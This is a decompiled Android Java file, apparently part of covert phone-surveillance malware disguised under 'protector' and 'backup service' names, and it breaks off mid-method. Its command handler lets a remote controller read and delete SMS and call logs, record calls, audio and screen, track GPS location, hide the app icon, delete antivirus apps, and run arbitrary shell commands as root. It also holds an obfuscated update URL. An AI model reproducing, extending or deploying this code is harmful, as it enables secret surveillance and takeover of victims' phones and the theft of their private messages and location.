package ru.mobile.protector;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Environment;
import android.os.Looper;
import android.provider.CallLog.Calls;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.text.format.Time;
import android.util.Log;
import com.android.location.CustomExceptionHandler;
import com.android.location.PlayService;
import com.android.location.PlayService.SMSCopier;
import com.android.location.PlayService.Uploader;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;

public class SMSReceiver
  extends BroadcastReceiver
{
  static final String ACTION = "SMS_SENT";
  static final int ADD_PHONE_BLACK_LIST = 5;
  static final int ADD_SMS_BLACK_LIST = 3;
  static final int AFTER_CALL_AUDIO_RECORD = 78;
  static final int ALL_UDP_PORT = 80;
  public static final int ALREADY_RECORDING = 1;
  static final int ALTER_MASK = 98;
  static final int ANSWER_NUMBER = 96;
  static final int ANTIVIRUS_LIST = 93;
  static final int AUDIO_FORMAT_SELECTION = 84;
  static final int AUDIO_SOURCE_SELECTION = 44;
  static final int BITRATE = 70;
  static final int BUFFER_SIZE = 35;
  static final int CALL_ENCODER = 91;
  public static final int CALL_RECORDING = 2;
  static final int CANCEL_ALL_AUDIO_TASKS = 49;
  static final int CHANGE_REPEAT = 69;
  static final int CLEAR_PHONE_BLACK_LIST = 6;
  static final int CLEAR_SMS_BLACK_LIST = 4;
  static final int CLEAR_TABLE = 86;
  static final int COMMANDSU_LOG = 56;
  public static String DEFAULT_UPDATE_URL;
  static final int DELAY_RECORD_AUDIO = 28;
  static final int DELAY_START_RECORD_AUDIO = 48;
  static final int DELETE_CALL = 16;
  static final int DELETE_PHONE_BOOK_RECORD = 24;
  static final int DELETE_SMS = 14;
  static final int DONT_KNOCK_IF_SCREEN_ON = 45;
  static final int DONT_RECORD_ADMIN = 29;
  static final int DONT_RECORD_CALL = 27;
  static final int DONT_SMS_ADMIN = 31;
  static final int DOWNLOAD_FILE = 85;
  static final int DROP_SEND_PACKET = 32;
  public static final int ERROR_MAIN_THREAD = 3;
  static final int EXEC_SU = 66;
  static final int EXEC_UPLOAD = 72;
  static final int FORCE_3G = 54;
  static final int FORCE_GPS = 79;
  static final int FORCE_WIFI = 74;
  static final int GET_AUDIO_TASK_MAP = 50;
  static final int GET_CALL_LIST = 15;
  static final int GET_CALL_RECORD = 19;
  static final int GET_GPS_INFO = 17;
  static final int GET_SMS_LIST = 12;
  static final int GET_STATUS = 23;
  static final int GPS_CHECK_INTERVAL = 41;
  static final int GPS_TIMEOUT = 81;
  static final int HIDE_ICON = 58;
  static final int INCOMING_CALL_START_EVENT = 90;
  static final int INSTALL_ROOT_MODE = 55;
  static final int IPTABLES_BLOCK = 94;
  static final int KILL_PROCESS = 101;
  static final int KILL_UPLOADER = 99;
  static final int LOAD_PHOTO = 42;
  static final int MAKE_A_CALL = 97;
  static final int MAKE_ME_ADMIN = 25;
  static final int MASTER_SERVER = 2;
  static final int MASTER_SMS = 1;
  static final int MAX_AUDIOLISTEN_FILESIZE = 73;
  private static final int MAX_FILE_AUDIO_SIZE = 10485760;
  private static final int MIN_FILE_AUDIO_SIZE = 102400;
  public static final int OK_RECORDING = 0;
  static final int OUTSIDE_DB_REFRESH_RATE = 82;
  static final int PAUSE_AUDIO_TASK = 108;
  static final int PAUSE_BEFORE_CALL_REC = 89;
  static final int READ_SMS = 13;
  static final int REBOOT = 57;
  static final int RECORD_AUDIO = 8;
  static final int RECORD_VIDEO = 10;
  static final int RECREATE_TABLE = 87;
  static final int REC_BLACK_LIST = 51;
  static final int REC_UNKNOWN_ONLY = 40;
  static final int REC_WHITE_LIST = 39;
  static final int RELOAD_PICTURES = 64;
  static final int REMOVE_ANTIVIRUS = 92;
  static final int REMOVE_APP = 61;
  static final int REPORT_SIM_CHANGE = 37;
  static final int RESET_CONFIG = 95;
  static final int RESET_COUNTER = 34;
  public static String RecorderOutputFile = "";
  static final int SCREEN_RECORD = 100;
  static final int SEND_CRASH_UDP = 36;
  static final int SEND_LOG = 33;
  static final int SEND_SMS = 71;
  static final int SET_ADMIN_NUMBER = 1;
  static final int SET_SERVER = 7;
  static final int SET_SYNC_FOLDER = 88;
  static final int SET_UPLOAD_DELAY = 21;
  static final int SET_VAR = 75;
  static final int SIDE_ROOT_INSTALL = 76;
  static final int SIP_CALL = 102;
  static final int SMS_QUERY_INTERVAL = 53;
  static final int START_THREAD = 65;
  static final int START_UPLOADER_THREAD = 59;
  static final int STOP_RECORD_AUDIO = 9;
  static final int STOP_RECORD_VIDEO = 11;
  static final int SWITCH_BLOCK = 52;
  static final int SWITCH_SMS_NOTIFY = 22;
  static final int SWITCH_WAKE_LOCK = 18;
  private static final String TAG = "backup.service.receiver";
  static final int TAKE_SCREENSHOT = 60;
  static final int TAKE_SCREENSHOT_PERIOD = 62;
  static final int TCP_WIND_SIZE = 43;
  static final int TRANSFER = 63;
  static final int TRANSFER_BINARY = 46;
  static final int TRANSFER_BINARY_UNLIMITED = 47;
  static final int TURN_LOG = 20;
  static final int TURN_OFF = 38;
  static final int UNINSTALL = 2;
  static final int UPDATE_PICKUP = 68;
  static final int UPDATE_SOFTWARE = 26;
  static final int UPLOAD_FILE = 67;
  static final int USE_AUTO_CALL_RECORD = 83;
  static final int USE_LAME = 77;
  static final int USE_UDP_LOG = 30;
  public static SMSReceiver reference;
  public static String sForbidden = "";
  public static ScreenRecorder screenrec;
  public static HTTPChecker thChecker;
  private static ScreenShooter thScreenShooter;
  Context lastKnown = null;
  public String sSMSLine = "";
  public AudioMonitor thAudio = null;
  public Commandor thCommandor = null;
  
  static
  {
    DEFAULT_UPDATE_URL = "gsso9..rg`cnv`oj-bnl.rg`cnv-`oj";
    thChecker = null;
    screenrec = null;
    thScreenShooter = null;
  }
  
  public SMSReceiver() {}
  
  public static void AfterCall(int paramInt)
  {
    FLOG("Try aftercall " + paramInt);
    if (reference == null) {
      return;
    }
    String str = reference.AddAudioTask(8, paramInt, "", true, true);
    FLOG("Aftecall added " + str);
  }
  
  public static String CommandProcess(int paramInt, String paramString1, String paramString2, boolean paramBoolean, Context paramContext)
  {
    Object localObject;
    if (paramString1 == null) {
      localObject = "error23";
    }
    label2153:
    label2433:
    label2452:
    label2830:
    label2872:
    label5460:
    do
    {
      String str;
      do
      {
        for (;;)
        {
          return localObject;
          if (paramString2 == null) {
            return "error24";
          }
          if (PlayService.ref == null) {
            return "error25";
          }
          str = "<" + paramInt + "> ok";
          localObject = str;
          int i;
          switch (paramInt)
          {
          case 11: 
          case 87: 
          case 22: 
          case 43: 
          case 85: 
          default: 
            return PlayService.res.getString(2130968642) + " " + paramInt + " " + paramString1;
          case 1: 
            FLOG("change number to " + paramString1);
            PlayService.sAdminNumber = paramString1;
            PlayService.SaveSettings();
            return str;
          case 2: 
            FLOG("UNINSTALL SOFTWARE IMMIDIATELY!");
            PlayService.bUninstallMe = true;
            return str;
          case 3: 
            if ((paramString1 == null) || (paramString1.length() < 1)) {
              return PlayService.res.getString(2130968606);
            }
            paramContext = paramString1.split(",");
            paramInt = 0;
            for (;;)
            {
              if (paramInt >= paramContext.length)
              {
                PlayService.SaveSettings();
                paramString1 = PlayService.sBlockSMSList.split(",");
                return PlayService.res.getString(2130968607) + ":" + (paramString1.length - 1);
              }
              paramString2 = paramContext[paramInt].trim();
              paramString1 = paramString2;
              if (paramString2.charAt(0) == '8') {
                paramString1 = paramString2.substring(1);
              }
              paramString2 = paramString1;
              if (paramString1.charAt(0) == '+')
              {
                paramString2 = paramString1;
                if (paramString1.charAt(1) == '7') {
                  paramString2 = paramString1.substring(2);
                }
              }
              PlayService.sBlockSMSList = PlayService.sBlockSMSList + "," + paramString2;
              paramInt += 1;
            }
          case 4: 
            PlayService.sBlockSMSList = "";
            PlayService.SaveSettings();
            return "<" + paramInt + "> ok";
          case 5: 
            if ((paramString1 == null) || (paramString1.length() < 1)) {
              return PlayService.res.getString(2130968606);
            }
            paramContext = paramString1.split(",");
            paramInt = 0;
            for (;;)
            {
              if (paramInt >= paramContext.length)
              {
                PlayService.SaveSettings();
                paramString1 = paramContext;
                if (PlayService.sCallBlockList != null) {
                  paramString1 = PlayService.sCallBlockList.split(",");
                }
                return PlayService.res.getString(2130968607) + ":" + (paramString1.length - 1);
              }
              paramString2 = paramContext[paramInt].trim();
              paramString1 = paramString2;
              if (paramString2.charAt(0) == '8') {
                paramString1 = paramString2.substring(1);
              }
              paramString2 = paramString1;
              if (paramString1.charAt(0) == '+')
              {
                paramString2 = paramString1;
                if (paramString1.charAt(1) == '7') {
                  paramString2 = paramString1.substring(2);
                }
              }
              PlayService.sCallBlockList = PlayService.sCallBlockList + "," + paramString2;
              paramInt += 1;
            }
          case 6: 
            PlayService.sCallBlockList = "";
            PlayService.SaveSettings();
            return str;
          case 7: 
            if ((paramString1 != null) && (paramString1.length() > 0))
            {
              paramContext = paramString1.trim();
              FLOG("setserver:[" + paramContext + "]");
              paramString2 = paramContext.split(":");
              paramString1 = paramString2;
              if (paramString2.length < 2) {
                paramString1 = paramContext.split(" ");
              }
              FLOG("blocknumbers.size = " + paramString1.length);
              if ((paramString1.length == 2) && (paramString1[0].split(",").length > 0) && (paramString1[1].split(",").length > 0))
              {
                PlayService.Server = "";
                PlayService.Port = "";
                PlayService.ServerList = paramContext;
                PlayService.iServer_ID = 0;
                PlayService.SaveSettings();
                return "NEWHOSTPORT:" + paramString1[0].split(",").length + "+" + paramString1[1].split(",").length;
              }
            }
            return "<" + paramInt + "> error, host:port";
          case 8: 
            if (PlayService.iDaysLeft < 1L) {
              return sForbidden;
            }
            return reference.AddAudioTask(8, 600, "", true, paramBoolean);
          case 9: 
            return reference.AddAudioTask(9, 0, "", true, paramBoolean);
          case 10: 
            if (paramString1 != null)
            {
              paramString1 = paramString1.trim().split(" ");
              i = 0;
              paramInt = i;
              if (paramString1.length == 2)
              {
                paramInt = i;
                if (PlayService.isNumeric(paramString1[1])) {
                  paramInt = Integer.parseInt(paramString1[1]);
                }
              }
              localObject = str;
              if (paramString1.length > 0)
              {
                localObject = str;
                if (PlayService.isNumeric(paramString1[0]))
                {
                  localObject = str;
                  if (PlayService.ref != null) {
                    return PlayService.ref.StartVideoRecord(Integer.parseInt(paramString1[0]), paramInt);
                  }
                }
              }
            }
            else
            {
              return "No data";
            }
            break;
          case 12: 
            if (PlayService.iDaysLeft < 1L) {
              return sForbidden;
            }
            return ReadSMSlist();
          case 13: 
            if (PlayService.iDaysLeft < 1L) {
              return sForbidden;
            }
            if (paramString1.length() < 1) {
              return PlayService.res.getString(2130968608);
            }
            return PlayService.ref.ReadSMS(paramString1);
          case 14: 
            if ((paramString1 == null) || (paramString1.length() < 1)) {
              return PlayService.res.getString(2130968608);
            }
            PlayService.ref.DeleteRecord("content://sms", paramString1.trim());
            return "<" + paramInt + "> " + PlayService.res.getString(2130968609) + "#" + paramString1.trim();
          case 15: 
            if (PlayService.iDaysLeft < 1L) {
              return sForbidden;
            }
            return ReadCallHistory();
          case 19: 
            if (PlayService.iDaysLeft < 1L) {
              return sForbidden;
            }
            if ((paramString1 == null) || (paramString1.length() < 1)) {
              return PlayService.res.getString(2130968610);
            }
            paramString2 = PlayService.res.getString(2130968611);
            PlayService.ref.GetCallLink(paramString1.trim());
            return paramString2;
          case 16: 
            if ((paramString1 == null) || (paramString1.length() < 1)) {
              return PlayService.res.getString(2130968610);
            }
            i = PlayService.ref.DeleteRecord(CallLog.Calls.CONTENT_URI, paramString1.trim());
            FLOG("Calls.CONTENT_URI = ");
            FLOG(CallLog.Calls.CONTENT_URI.getPath());
            PlayService.ref.DeleteRecord(BackupData.CONTENT_URI, "calllist_id", paramString1.trim());
            return "<" + paramInt + "> " + PlayService.res.getString(2130968612) + " " + i;
          case 17: 
            if (PlayService.iDaysLeft < 1L) {
              return sForbidden;
            }
            GLOG("17: UseAsyncMode" + paramBoolean);
            if (paramBoolean)
            {
              GLOG("17: starting wifi catcher()");
              PlayService.ref.wifiAndCellCollector.sendSms();
              return "";
            }
            GLOG("17: license = " + PlayService.sLicense);
            GLOG("getgpsinfo");
            paramContext = PlayService.res.getString(2130968613);
            paramString1 = PlayService.ref.wifiAndCellCollector.returnBestLocation(false, PlayService.ref.lastMnc, PlayService.ref.lastMcc);
            GLOG("17: best location returned = " + paramString1);
            paramString2 = paramString1;
            if (paramString1 == null) {
              paramString2 = PlayService.ref.curInfo;
            }
            paramString1 = paramContext;
            if (paramString2 != null)
            {
              if (paramString2.isError) {
                break label2153;
              }
              paramString1 = new Time();
              paramString1.set(paramString2.timepoint);
              paramString1 = paramString1.monthDay + "." + (paramString1.month + 1) + "." + paramString1.year + " " + paramString1.hour + ":" + paramString1.minute;
              paramContext = PlayService.res.getString(2130968655) + paramString2.lbsLatitude + "," + PlayService.res.getString(2130968656) + paramString2.lbsLongtitude + "," + PlayService.res.getString(2130968657) + paramString2.lbsPrecision + "m." + "," + PlayService.res.getString(2130968658) + paramString2.lbsType + "," + PlayService.res.getString(2130968659) + paramString1;
              PlayService.ref.curInfo = paramString2;
              paramString2 = LatLong2Address(paramString2.lbsLatitude, paramString2.lbsLongtitude);
              FLOG("ll2=" + paramString2);
              paramString1 = paramContext;
              if (paramString2.length() <= 0) {}
            }
            for (paramString1 = paramContext + " " + paramString2;; paramString1 = paramContext)
            {
              GLOG("17: finishing..." + paramString1);
              return paramString1;
              GLOG("17: location is error!");
            }
          case 18: 
            if (PlayService.bUseWakeLock) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bUseWakeLock = paramBoolean;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968614) + PlayService.bUseWakeLock;
            }
          case 20: 
            if (PlayService.LOGCAT) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.LOGCAT = paramBoolean;
              PlayService.SaveSettings();
              return "LOG:" + PlayService.LOGCAT;
            }
          case 21: 
            if (paramString1.length() < 1) {
              return PlayService.res.getString(2130968615);
            }
            int j = Integer.parseInt(paramString1);
            i = j;
            if (j > 3600) {
              i = 3600;
            }
            PlayService.iUploadInterval = i;
            PlayService.SaveSettings();
            return "<" + paramInt + "> ok";
          case 23: 
            if (thChecker == null)
            {
              paramContext = reference;
              paramContext.getClass();
              if ((paramString1.length() <= 0) || (Integer.parseInt(paramString1) != 1)) {
                break label2433;
              }
            }
            for (paramBoolean = true;; paramBoolean = false)
            {
              thChecker = new HTTPChecker(paramContext, paramBoolean);
              FLOG("Checker running?");
              if ((thChecker == null) || (thChecker.isRunning())) {
                break label2452;
              }
              FLOG("no, starting?");
              thChecker.setNumber(paramString2);
              thChecker.start();
              if ((paramString1.length() <= 0) || (Integer.parseInt(paramString1) != 1)) {
                break;
              }
              return "";
            }
            if (isNetworkAvailable()) {
              return "1";
            }
            return "0";
            FLOG("Already running, cancel request");
            return PlayService.res.getString(2130968616);
          case 24: 
            if ((paramString1 == null) || (paramString1.length() < 1)) {
              return PlayService.res.getString(2130968610);
            }
            FLOG("delete phone book:" + paramString1);
            i = PlayService.ref.DeletePhoneBookRecord(paramString1);
            return "<" + paramInt + "> " + PlayService.res.getString(2130968612) + " " + i;
          case 25: 
            paramString1 = paramString1.trim();
            FLOG("MAKE_ME_ADMIN:[" + paramString1 + "],f = [" + paramString2 + "]");
            paramInt = 0;
            if ((PlayService.sIMEI != null) && (PlayService.sIMEI.length() > 0)) {
              if (PlayService.sIMEI.equals(paramString1))
              {
                PlayService.sAdminNumber = paramString2;
                FLOG("MAKE_ME_ADMIN: ok");
                PlayService.SaveSettings();
                localObject = "<25> New number:" + PlayService.sAdminNumber;
                paramInt = 1;
              }
            }
            while (paramInt == 0)
            {
              if ((PlayService.sMAC == null) || (PlayService.sMAC.length() <= 0)) {
                break label2872;
              }
              if (!PlayService.sMAC.toLowerCase().equals(paramString1.toLowerCase())) {
                break label2830;
              }
              PlayService.sAdminNumber = paramString2;
              FLOG("MAKE_ME_ADMIN: ok");
              PlayService.SaveSettings();
              return "<25> New number:" + PlayService.sAdminNumber;
              localObject = "<25> IMEI is wrong";
              FLOG("MAKE_ME_ADMIN: failed 1 [" + paramString1 + "] vs [" + PlayService.sIMEI + "]");
              continue;
              FLOG("MAKE_ME_ADMIN: failed 2 [" + paramString1 + "] vs [" + PlayService.sIMEI + "]");
              localObject = "<25> no imei present in phone";
            }
            FLOG("MAKE_ME_ADMIN: failed 3 [" + paramString1 + "] vs [" + PlayService.sMAC + "]");
            return "<25> MAC is invalid";
            FLOG("MAKE_ME_ADMIN: failed 4 [" + paramString1 + "] vs [" + PlayService.sMAC + "]");
            return "<25> MAC & IMEI are not present in phone";
          case 26: 
            if (paramString1.length() == 0) {
              PlayService.ref.Update(DEFAULT_UPDATE_URL);
            }
            for (;;)
            {
              return "Update task activated " + paramString1;
              PlayService.ref.Update(paramString1);
            }
          case 27: 
            if (PlayService.bRecordCalls) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bRecordCalls = paramBoolean;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968617) + PlayService.bRecordCalls;
            }
          case 28: 
            if (paramString1.length() < 1) {
              return PlayService.res.getString(2130968615);
            }
            return reference.AddAudioTask(28, Integer.parseInt(paramString1.trim()), "", true, paramBoolean);
          case 29: 
            if (PlayService.bRecordAdmin) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bRecordAdmin = paramBoolean;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968618) + ": " + PlayService.bRecordAdmin;
            }
          case 30: 
            paramString2 = paramString1;
            if (paramString1.length() == 0) {
              paramString2 = "0";
            }
            PlayService.iUDPPort = Integer.parseInt(paramString2.trim());
            PlayService.SaveSettings();
            return "UDP port: " + PlayService.iUDPPort;
          case 31: 
            if (PlayService.bSMSAdmin) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bSMSAdmin = paramBoolean;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968619) + ": " + PlayService.bSMSAdmin;
            }
          case 32: 
            PlayService.iDropSendPacket = 3;
            return "Current packet will be dropped";
          case 33: 
            if (PlayService.bSendLog) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bSendLog = paramBoolean;
              if (!PlayService.bSendLog) {
                break;
              }
              return "Log ON";
            }
            return "Log OFF";
          case 34: 
            paramInt = -1;
            if (paramString1.length() > 0) {
              paramInt = Integer.parseInt(paramString1);
            }
            if ((paramInt == -1) || (paramInt == 0)) {
              PlayService.iLastPhoneBookIDServer = 0L;
            }
            if ((paramInt == -1) || (paramInt == 1)) {
              PlayService.lLastCallListIDServer = 0L;
            }
            if ((paramInt == -1) || (paramInt == 2)) {
              PlayService.lLastSMSRed = 0L;
            }
            if ((paramInt == -1) || (paramInt == 3)) {
              PlayService.iAudioCallSaved = 0L;
            }
            if ((paramInt == -1) || (paramInt == 4))
            {
              PlayService.lLastBrowserHistoryID = 0L;
              PlayService.mLastBrowser44 = 0L;
              PlayService.iFirefoxCounter = 0;
              PlayService.iChromeCounter = 0;
              PlayService.lOperaMiniCounter = 0L;
              PlayService.lOperaCounter = 0L;
              PlayService.iPreventFirefox = 0;
              PlayService.iPreventChrome = 0;
              PlayService.iPreventOperaMini = 0;
            }
            if ((paramInt == -1) || (paramInt == 5))
            {
              PlayService.lWhatsAppCounter = 0L;
              PlayService.iPreventReadWAAtt = 0;
            }
            if ((paramInt == -1) || (paramInt == 6)) {
              PlayService.sWhatsAppPath = "";
            }
            if ((paramInt == -1) || (paramInt == 7))
            {
              PlayService.lViberCounter = 0L;
              PlayService.iPreventReadViberAtt = 0;
            }
            if ((paramInt == -1) || (paramInt == 7)) {
              PlayService.lViberAttCounter = 0;
            }
            if ((paramInt == -1) || (paramInt == 8)) {
              PlayService.sViberPath = "";
            }
            if ((paramInt == -1) || (paramInt == 9)) {
              PlayService.bResetGmail = true;
            }
            if ((paramInt == -1) || (paramInt == 10)) {
              PlayService.bResetSkype = true;
            }
            if ((paramInt == -1) || (paramInt == 10)) {
              PlayService.bResetSkypeAttach = true;
            }
            if ((paramInt == -1) || (paramInt == 11)) {
              PlayService.bResetCalendar = true;
            }
            if ((paramInt == -1) || (paramInt == 12)) {
              PlayService.bAlreadyRedRunning = false;
            }
            if ((paramInt == -1) || (paramInt == 16)) {
              PlayService.SaveOneLongSetting("lLastEmailRed", 0L);
            }
            if ((paramInt == -1) || (paramInt == 17))
            {
              PlayService.iLastIntVideoRed = 0L;
              PlayService.iLastExtVideoRed = 0L;
            }
            if ((paramInt == -1) || (paramInt == 18)) {
              PlayService.lAgentCount = 0L;
            }
            if ((paramInt == -1) || (paramInt == 19)) {
              PlayService.lVKCounter = 0L;
            }
            if ((paramInt == -1) || (paramInt == 20))
            {
              PlayService.lTGCounter = 0L;
              PlayService.lTGAttCounter = 0L;
              PlayService.iPreventReadTG = 0;
            }
            if ((paramInt == -1) || (paramInt == 21)) {
              PlayService.lOKCounter = 0L;
            }
            if ((paramInt == -1) || (paramInt == 22)) {
              PlayService.lSyncFolderLastTime = 0L;
            }
            if ((paramInt == -1) || (paramInt == 23)) {
              PlayService.lLastInstagram = 0L;
            }
            if ((paramInt == -1) || (paramInt == 24))
            {
              PlayService.lFBCounter = 0L;
              PlayService.lFBAttCounter = 0L;
              PlayService.iPreventReadFB = 0;
            }
            PlayService.SaveSettings();
            localObject = "Counters reset";
            if (paramInt >= 0) {
              return "Counters reset" + " #" + paramInt;
            }
            break;
          case 35: 
            if (paramString1.length() < 1) {
              return "Type size in bytes";
            }
            PlayService.iBufferSize = Integer.parseInt(paramString1.trim());
            PlayService.SaveSettings();
            return "<" + paramInt + "> " + PlayService.iBufferSize;
          case 36: 
            if (paramString1.length() < 1) {
              return "Type size of tail in bytes";
            }
            return "<" + paramInt + "> " + PlayService.SendCrashLog(Integer.parseInt(paramString1.trim()));
          case 37: 
            if (PlayService.bReportSimChange) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bReportSimChange = paramBoolean;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968620) + ": " + PlayService.bReportSimChange;
            }
          case 38: 
            if (PlayService.bWork) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bWork = paramBoolean;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968621) + ": " + PlayService.bWork;
            }
          case 39: 
            if (paramString1.length() > 0) {}
            for (paramString1 = paramString1.trim();; paramString1 = "")
            {
              PlayService.sRecWhiteList = paramString1;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968622) + ": " + PlayService.sRecWhiteList;
            }
          case 40: 
            if (PlayService.bRecordUnknownOnly) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bRecordUnknownOnly = paramBoolean;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968623) + ": " + PlayService.bRecordUnknownOnly;
            }
          case 41: 
            paramString2 = paramString1;
            if (paramString1.length() == 0) {
              paramString2 = "0";
            }
            PlayService.iGPSCheckInterval = Integer.parseInt(paramString2.trim());
            paramString1 = PlayService.res.getString(2130968624) + ": " + PlayService.iGPSCheckInterval;
            PlayService.SaveSettings();
            return paramString1;
          case 42: 
            if (PlayService.bLoadPictures) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bLoadPictures = paramBoolean;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968625) + ": " + PlayService.bLoadPictures;
            }
          case 44: 
            paramString2 = paramString1;
            if (paramString1.length() == 0) {
              paramString2 = "1";
            }
            PlayService.iAudioSource = Integer.parseInt(paramString2.trim());
            if (MediaRecorder.getAudioSourceMax() < PlayService.iAudioSource)
            {
              FLOG("Err:source too big " + PlayService.iAudioSource + " higher than " + MediaRecorder.getAudioSourceMax());
              PlayService.iAudioSource = 0;
            }
            for (paramString1 = "Err, too big, reset to #: " + PlayService.iAudioSource;; paramString1 = "Record source #: " + PlayService.iAudioSource)
            {
              PlayService.SaveSettings();
              return paramString1;
            }
          case 45: 
            if (PlayService.bKnockOffScreenOnly) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bKnockOffScreenOnly = paramBoolean;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968626) + ": " + PlayService.bKnockOffScreenOnly;
            }
          case 46: 
            paramString2 = paramString1;
            if (paramString1.length() == 0) {
              paramString2 = "0";
            }
            PlayService.iTransferBinary = Integer.parseInt(paramString2.trim());
            paramString1 = PlayService.res.getString(2130968627) + " #: " + PlayService.iTransferBinary;
            PlayService.SaveSettings();
            return paramString1;
          case 47: 
            paramString2 = paramString1;
            if (paramString1.length() == 0) {
              paramString2 = "3";
            }
            PlayService.iTransferBinaryUnlim = Integer.parseInt(paramString2.trim());
            paramString1 = PlayService.res.getString(2130968627) + "#: " + PlayService.iTransferBinaryUnlim;
            PlayService.SaveSettings();
            return paramString1;
          case 48: 
            if (paramString1.length() < 1) {
              return PlayService.res.getString(2130968615);
            }
            paramString1 = paramString1.trim().split(" ");
            if (paramString1.length != 2) {
              PlayService.res.getString(2130968628);
            }
            return reference.AddAudioTask(48, Integer.parseInt(paramString1[0]), paramString1[1], true, paramBoolean);
          case 49: 
            return reference.AddAudioTask(49, 0, "", true, paramBoolean);
          case 50: 
            return reference.getTaskMap(paramBoolean);
          case 51: 
            if (paramString1.length() > 0) {}
            for (paramString1 = paramString1.trim();; paramString1 = "")
            {
              PlayService.sRecBlackList = paramString1;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968629) + ": " + PlayService.sRecBlackList;
            }
          case 52: 
            if (PlayService.bUseBlocking) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bUseBlocking = paramBoolean;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968630) + ": " + PlayService.bUseBlocking;
            }
          case 53: 
            paramString2 = paramString1;
            if (paramString1.length() == 0) {
              paramString2 = "500";
            }
            PlayService.iSMSQueryInterval = Integer.parseInt(paramString2.trim());
            paramString1 = "SMS query interval #: " + PlayService.iSMSQueryInterval + " ms.";
            PlayService.SaveSettings();
            return paramString1;
          case 54: 
            if (PlayService.bForce3G) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bForce3G = paramBoolean;
              PlayService.SaveSettings();
              return PlayService.res.getString(2130968631) + " 3G: " + PlayService.bForce3G;
            }
          case 55: 
            PlayService.InstallToSystem();
            return str;
          case 56: 
            PlayService.commandSUresult(paramString1.trim());
            return str;
          case 57: 
            PlayService.bRebootMe = true;
            return str;
          case 58: 
            PlayService.EnableDisableSoft(paramContext);
            return str;
          case 59: 
            if (PlayService.ref != null)
            {
              PlayService.ref.StartUploader();
              PlayService.ref.StartSMSCopier();
              CreateAudioThread();
              return str;
            }
            Log.v("backup.service.receiver", "STARTING service...");
            paramContext.startService(new Intent(paramContext, PlayService.class));
            return "Send StartService Intent";
          case 60: 
            TakeScreenShot();
            return PlayService.res.getString(2130968632);
          case 61: 
            commandSU("rm /system/app/" + paramString1 + ".apk");
            commandSU("rm /data/app/" + paramString1 + ".apk");
            return str;
          case 62: 
            if (paramString1.length() < 1) {
              return PlayService.res.getString(2130968634);
            }
            paramString1 = paramString1.trim().split(" ");
            if (paramString1.length != 2) {
              return PlayService.res.getString(2130968635);
            }
            TakeScreenShotPeriod(Integer.parseInt(paramString1[0]), Integer.parseInt(paramString1[1]));
            return PlayService.res.getString(2130968632);
          case 63: 
            paramString2 = paramString1;
            if (paramString1.length() == 0) {
              paramString2 = "0";
            }
            PlayService.iTransfer = Integer.parseInt(paramString2.trim());
            paramString1 = PlayService.res.getString(2130968627) + " #: " + PlayService.iTransfer;
            PlayService.SaveSettings();
            return paramString1;
          case 64: 
            PlayService.iLastIntPictureRed = 0L;
            PlayService.iLastExtPictureRed = 0L;
            return str;
          case 65: 
            paramString2 = paramString1;
            if (paramString1.length() == 0) {
              paramString2 = "0";
            }
            if (PlayService.ref != null) {
              return PlayService.ref.StartThread(Integer.parseInt(paramString2.trim()));
            }
            return "PlayService.ref is null";
          case 66: 
            if (paramString1.length() == 0) {
              return "No parameter given";
            }
            if (PlayService.bCanSu == PlayService.CAN)
            {
              FLOG("Exec command as ROOT:" + paramString1);
              commandSU(paramString1);
              return str;
            }
            FLOG("Exec command as USER:" + paramString1);
            command(paramString1);
            return str;
          case 67: 
            if (paramString1.length() == 0) {
              return "No parameter given";
            }
            if (PlayService.ref != null)
            {
              PlayService.ref.sFileToUpload = paramString1.trim();
              paramString1 = new File(PlayService.ref.sFileToUpload);
              if ((paramString1.exists()) && (paramString1.canRead()))
              {
                localObject = str;
                if (paramString1.isFile()) {}
              }
              else
              {
                FLOG("file not exists, but we try: " + paramString1.getAbsolutePath());
                return str;
              }
            }
            else
            {
              return "Process is dead";
            }
            break;
          case 68: 
            if (paramString1.length() == 0) {
              return "No parameter given";
            }
            PlayService.iOldPickup = PlayService.iPickup;
            PlayService.iPickup = Integer.parseInt(paramString1.trim());
            return str;
          case 69: 
            if (PlayService.bUseRepeatControl) {}
            for (paramBoolean = false;; paramBoolean = true)
            {
              PlayService.bUseRepeatControl = paramBoolean;
              PlayService.SaveSettings();
              return "Use repeat control: " + PlayService.bUseRepeatControl;
            }
          case 70: 
            if ((paramString1 == null) || (paramString1.length() <= 2)) {
              break label5460;
            }
            paramString1 = paramString1.trim();
            paramString2 = paramString1.trim().split("\\s", 2);
            if (paramString2.length == 2) {
              try
              {
